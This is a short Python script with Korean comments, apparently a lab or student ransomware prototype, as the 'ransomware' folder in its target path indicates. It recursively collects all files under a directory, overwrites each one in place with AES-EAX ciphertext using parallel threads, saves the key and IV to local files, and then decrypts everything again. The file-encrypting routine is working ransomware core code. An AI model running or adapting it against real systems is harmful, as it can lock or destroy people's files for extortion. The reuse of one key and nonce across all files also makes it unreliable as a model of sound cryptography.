import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor

# AES 암호화 키 생성
def generate_key():
    key = get_random_bytes(16)  # 16바이트의 무작위 키 생성
    iv = get_random_bytes(16)
    with open("encrypt_key.key", "wb") as key_file:
        key_file.write(key)
    with open("encrypt_iv.iv", "wb") as iv_file:
        iv_file.write(iv)
    return key, iv

# AES 파일 암호화
def encrypt_file_aes(filename, key, iv):
    block_size = 16
    cipher = AES.new(key, AES.MODE_EAX, nonce=iv)

    with open(filename, "rb") as file:
        file_data = file.read()

    encrypted_data, tag = cipher.encrypt_and_digest(file_data)

    file_size = len(encrypted_data).to_bytes(16, byteorder='big')

    with open(filename, "wb") as file:
        file.write(encrypted_data)

# 각 파일에 대한 고유한 키와 IV 생성
def process_file(filename):
    encrypt_file_aes(filename, key, iv)


# AES 파일 복호화
def decrypt_file_aes(filename, key, iv):
    block_size = 16

    with open(filename, 'rb') as file:
        cipher = AES.new(key, AES.MODE_EAX, nonce=iv)
        encrypted_data = file.read()
    
    decrypted_data = cipher.decrypt(encrypted_data)

    with open(filename, "wb") as file:
        file.write(decrypted_data)  # 파일 크기에 맞게 복구

def decrypt_file(filename):
    key = open("encrypt_key.key", "rb").read() # 암호화에 사용한 키를 읽어옴
    iv = open("encrypt_iv.iv", "rb").read() # IV(nonce)를 읽어옴
    decrypt_file_aes(filename, key, iv)

if __name__ == "__main__":
    key, iv = generate_key()  # 키, IV 생성 (한 번만 실행)
    directory_to_process = r'C:\Users\dnwjd\OneDrive\Desktop\pay1oad\ransomware\file'

    # 디렉터리 내의 모든 파일 목록을 가져옴
    file_list = []
    for root, dirs, files in os.walk(directory_to_process):
        for file in files:
            file_path = os.path.join(root, file)
            file_list.append(file_path)
    
    # 파일을 생성 날짜 순서로 정렬
    file_list.sort(key=lambda x: os.path.getmtime(x))

    # 암호화 작업을 병렬로 처리
    num_threads = 4 # 병렬 처리할 스레드 수
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        executor.map(process_file, file_list) 
    print("모든 파일이 AES_EAX 모드로 암호화 되었습니다. ")

    # 복호화 작업을 병렬로 처리
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        executor.map(decrypt_file, file_list)
    print("모든 파일이 복호화 되었습니다. ")
    
